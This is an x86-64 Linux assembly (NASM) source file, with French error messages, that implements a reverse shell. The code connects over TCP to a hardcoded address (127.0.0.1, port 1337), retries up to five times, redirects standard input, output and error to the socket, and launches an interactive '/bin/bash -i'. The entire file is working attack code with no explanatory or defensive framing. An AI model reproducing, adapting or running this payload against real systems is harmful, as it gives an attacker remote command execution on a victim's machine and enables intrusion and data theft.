segment .bss
	struc sockaddr	; struct for socket

		sin_family: resw 1	; AF_INET (IPv4)
		sin_port: resw 1	; port
		sin_addr: resd 1	; address

	endstruc
	
segment .rodata
	sockaddr_struct_init:

		istruc sockaddr
			at sin_family, dw 0x2		; AF_INET (IPv4)
			at sin_port, dw 0x3905		; port in little endian
			at sin_addr, dd 0x0100007f	; IP in little endian
		iend
	error_socket  db "[X] Erreur: socket échoué", 10
	error_dup2_0  db "[X] Erreur: dup2 stdin échoué", 10
	error_dup2_1  db "[X] Erreur: dup2 stdout échoué", 10
	error_dup2_2  db "[X] Erreur: dup2 stderr échoué", 10
	error_execve db "[X] Erreur: execve échoué", 10

	retry_connect db "[O] Info: tentative de reconnection ...", 10
	max_attempts db "[X] Erreur: Maximum de tentatives atteint", 10

segment .data
    binsh db "/bin/bash", 0
    arg0      db "bash", 0
    arg1      db "-i", 0
	
	retry_count dd 0	; variable for counter


	argv:
		dq arg0
		dq arg1
		dq 0

	timespec:
        dq 2      ; tv_sec = 2s
        dq 0       ; tv_nsec = 0

segment .text
	global _start:

_start:
	mov rax, 41	; syscall for socket
	mov rdi, 2	; Domain (IPv4)
	mov rsi, 1	; type (TCP)
	mov rdx, 6	; protocol (TCP)
	syscall

	test rax, rax	; test if rax = 0
	js _socket_error

	push rax	; save the fd
	jmp _connection

_connection:
	mov rax, 42	; syscall for connexion
	pop rdi		; recover the fd
	push rdi
	mov rsi, sockaddr_struct_init
	mov rdx, 0x10	; address lengh
	syscall

	test rax, rax
	js _connect_error	

	jmp _fd_stdin

_fd_stdin:
        mov     rax, 33	; syscall dup2 
        pop     rdi
        push    rdi
	mov     rsi, 0	; in <-
        syscall

	test rax, rax
	js _dup2_0_error

        jmp     _fd_stdout

_fd_stdout:
        mov     rax, 33	; syscall dup2
        pop     rdi
        push    rdi
	mov     rsi, 1	; out ->
        syscall

	test rax, rax
	js _dup2_1_error

	jmp _fd_stderr

_fd_stderr:
        mov     rax, 33	; syscall dup2
        pop     rdi
        push    rdi
	mov     rsi, 2	; error X
        syscall

	test rax, rax
	js _dup2_2_error

        jmp _execution



_execution:
    mov rax, 59                  ; syscall execve
    lea rdi, [rel binsh]     ; chemin vers /bin/bash
    lea rsi, [rel argv]          ; argv = {"bash", "-i", NULL}
	xor rdx, rdx
    syscall

    test rax, rax
    js _execve_error

_connect_error:
    ; sleep(2)
    	mov rax, 35             ; syscall nanosleep
   	lea rdi, [rel timespec] ; struct timespec
    	xor rsi, rsi            ; no old_timespec
    	syscall
   
    	inc dword [retry_count]
    	cmp dword [retry_count], 5
    	jb _retry_connect_msg         ; retry connection

	mov rax, 1
	mov rdi, 2
	mov rsi, max_attempts
	mov rdx, 42
	syscall
	jmp _exit

_retry_connect_msg:
    mov rax, 1		; syscall write
    mov rdi, 2		; error
    mov rsi, retry_connect
    mov rdx, 40 	; msglen
    syscall

    jmp _connection

_socket_error:
	mov rsi, error_socket ; put the message in rsi
	mov rdx, 27
	jmp _error


_dup2_0_error:
    	mov rsi, error_dup2_0
    	mov rdx, 31
	jmp _error

_dup2_1_error:
    	mov rsi, error_dup2_1
    	mov rdx, 32
	jmp _error

_dup2_2_error:
    	mov rsi, error_dup2_2
    	mov rdx, 32
	jmp _error

_execve_error:
    	mov rsi, error_execve
    	mov rdx, 27
	jmp _error

_error:
	mov rax, 1	; syscall write
	mov rdi, 2	; error
	syscall

	mov rax, 60
	xor rdi, rdi
	syscall

_exit:
	mov rax, 60
	mov rdi, 1
	syscall
